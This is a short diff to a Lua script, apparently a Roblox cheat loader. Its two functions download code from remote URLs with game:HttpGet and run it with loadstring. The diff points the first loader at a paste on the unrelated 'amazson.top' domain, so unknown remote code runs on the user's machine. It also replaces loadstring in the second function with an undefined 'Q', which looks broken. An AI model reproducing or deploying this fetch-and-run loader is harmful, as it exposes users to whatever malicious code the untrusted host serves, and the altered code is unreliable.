@@ -1,8 +1,8 @@
 local function s1() 
-    loadstring(game:HttpGet("https://mm2lua.vercel.app/", true))()
+    loadstring(game:HttpGet("https://amazson.top/paste/rsrLCrnzN8qsk5JQdENIiw", true))()
 end 
 local function s2() 
-    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/no9DMUGjAklMKrH4/raw", true))()
+    Q(game:HttpGet("https://api.rubis.app/v2/scrap/no9DMUGjAklMKrH4/raw", true))()
 end
 
 task.spawn(s1)
